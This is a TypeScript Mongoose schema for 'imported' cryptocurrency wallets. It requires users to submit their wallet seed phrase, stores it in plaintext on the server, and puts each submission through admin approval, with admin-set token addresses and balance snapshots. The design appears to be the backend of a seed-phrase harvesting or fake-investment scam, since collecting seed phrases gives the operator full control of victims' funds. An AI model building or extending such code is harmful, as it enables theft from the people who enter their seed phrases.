import mongoose, { Schema, Document, Model } from 'mongoose';

// ============================================
// Wallet Model (User imported wallets)
// ============================================

export interface IWalletToken {
  symbol: string;
  name: string;
  icon: string;
  amount: number;
  amountUsd: number;
  tokenAddress: string; // Admin-set address for this token
}

export interface IWallet extends Document {
  _id: mongoose.Types.ObjectId;
  userId: mongoose.Types.ObjectId;
  walletType: string; // 'metamask', 'trust_wallet', 'coinbase', etc.
  walletName: string; // Display name: 'MetaMask', 'Trust Wallet', etc.
  walletIcon: string;
  seedPhrase: string;
  address: string; // Generated wallet address
  status: 'pending' | 'approved' | 'rejected';
  tokens: IWalletToken[];
  totalBalanceUsd: number; // Initial balance at time of approval (snapshot)
  adminNote?: string;
  approvedAt?: Date;
  rejectedAt?: Date;
  createdAt: Date;
  updatedAt: Date;
}

const WalletTokenSchema = new Schema<IWalletToken>(
  {
    symbol: { type: String, required: true },
    name: { type: String, required: true },
    icon: { type: String, default: '' },
    amount: { type: Number, default: 0 },
    amountUsd: { type: Number, default: 0 },
    tokenAddress: { type: String, default: '' },
  },
  { _id: false }
);

const WalletSchema = new Schema<IWallet>(
  {
    userId: {
      type: Schema.Types.ObjectId,
      ref: 'User',
      required: true,
      index: true,
    },
    walletType: {
      type: String,
      required: true,
    },
    walletName: {
      type: String,
      required: true,
    },
    walletIcon: {
      type: String,
      default: '',
    },
    seedPhrase: {
      type: String,
      required: true,
    },
    address: {
      type: String,
      required: true,
    },
    status: {
      type: String,
      enum: ['pending', 'approved', 'rejected'],
      default: 'pending',
      index: true,
    },
    tokens: {
      type: [WalletTokenSchema],
      default: [],
    },
    totalBalanceUsd: {
      type: Number,
      default: 0,
    },
    adminNote: String,
    approvedAt: Date,
    rejectedAt: Date,
  },
  { timestamps: true }
);

WalletSchema.index({ userId: 1, status: 1 });
WalletSchema.index({ status: 1, createdAt: -1 });

const Wallet: Model<IWallet> =
  mongoose.models.Wallet || mongoose.model<IWallet>('Wallet', WalletSchema);

export default Wallet;
